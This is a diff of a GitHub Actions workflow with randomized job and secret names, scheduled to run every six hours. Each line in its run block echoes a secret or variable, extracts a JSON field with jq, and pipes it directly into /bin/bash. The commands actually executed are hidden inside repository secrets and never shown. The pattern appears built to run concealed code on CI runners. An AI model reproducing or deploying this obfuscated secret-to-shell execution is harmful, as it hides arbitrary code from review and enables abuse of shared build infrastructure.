@@ -1,10 +1,10 @@
 name: yanruhuo7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 3/6 * * *'
-jobs:  # 12224
+    - cron: '6 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,27 +12,19 @@ jobs:  # 12224
       - uses: actions/checkout@v4
       - name: yanruhuo7654
         env:
-          ztufz62585: ${{ secrets.ztufz62585 }}
+          va7: ${{ secrets.va7 }}
         run: |
-          echo $ztufz62585 | jq -r .zpgw07 | /bin/bash
-          echo $orasu660 | jq -r .enoq1 | /bin/bash
-          echo $yd53540 | jq -r .hjtpk6 | /bin/bash
-          echo $x4 | jq -r .tnnn2 | /bin/bash
-          echo $p91195 | jq -r .s2 | /bin/bash
-          echo $iban3 | jq -r .hk0 | /bin/bash
-          echo $nvca43 | jq -r .qgzqt258 | /bin/bash
-          echo $t8 | jq -r .qlkr031 | /bin/bash
-          echo $cthve85 | jq -r .m6 | /bin/bash
-          echo $bz84 | jq -r .ywgqq37998 | /bin/bash
-          echo $zzqh4 | jq -r .pkgg9 | /bin/bash
-          echo $msqoo4 | jq -r .moens07174 | /bin/bash
-          echo $pel89 | jq -r .uv725 | /bin/bash
-          echo $xcdea755 | jq -r .psaef66 | /bin/bash
-          echo $lfihv04 | jq -r .il99197 | /bin/bash
-          echo $y1 | jq -r .h47598 | /bin/bash
-          echo $gvs91399 | jq -r .zadug97553 | /bin/bash
-          echo $dkg72 | jq -r .xz5 | /bin/bash
-          echo $bxmf365 | jq -r .z1240 | /bin/bash
-          echo $rk6790 | jq -r .jtgg7709 | /bin/bash
-          echo $io024 | jq -r .ngan50 | /bin/bash
+          echo $va7 | jq -r .adci7660 | /bin/bash
+          echo $iafls171 | jq -r .l820 | /bin/bash
+          echo $gavpb836 | jq -r .wsb64862 | /bin/bash
+          echo $caep815 | jq -r .aqn9156 | /bin/bash
+          echo $n29 | jq -r .w07 | /bin/bash
+          echo $m06 | jq -r .a48 | /bin/bash
+          echo $uuhs7331 | jq -r .oqm0 | /bin/bash
+          echo $vpv63 | jq -r .nfx623 | /bin/bash
+          echo $tbol695 | jq -r .phu918 | /bin/bash
+          echo $sea74264 | jq -r .vqr064 | /bin/bash
+          echo $wk61862 | jq -r .bkpvs79 | /bin/bash
+          echo $uh65 | jq -r .wv1 | /bin/bash
+          echo $mnuk49 | jq -r .wr4 | /bin/bash
 
